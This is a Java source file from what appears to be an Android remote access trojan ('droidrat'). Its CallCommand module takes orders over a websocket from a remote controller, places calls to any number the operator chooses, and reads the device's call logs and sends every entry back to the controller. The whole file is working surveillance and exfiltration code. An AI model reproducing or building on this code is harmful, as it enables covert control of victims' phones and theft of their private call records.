package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.util.Log;


import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.modules.appintent.call.Call;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class CallCommand extends CommandFather {

    private final String TAG = "Call Event ";

    private Call call;

    private Context context;

    public CallCommand(Context context) {
        this.context = context;
        call = new Call(context);
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {
                case "Call":
                    String phoneNumber = rawCommandArray[2];
                    Log.d(TAG, "Call CallPhone " + phoneNumber);
                    call.call(phoneNumber);
                    this.send("Call CallPhone " + phoneNumber);
                    break;

                case "CallLogs":
                    Log.d(TAG, "Call CallLogs ");
                    for (String callLogs : call.getCallLogs())
                        this.send("Call CallLogs " + callLogs);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
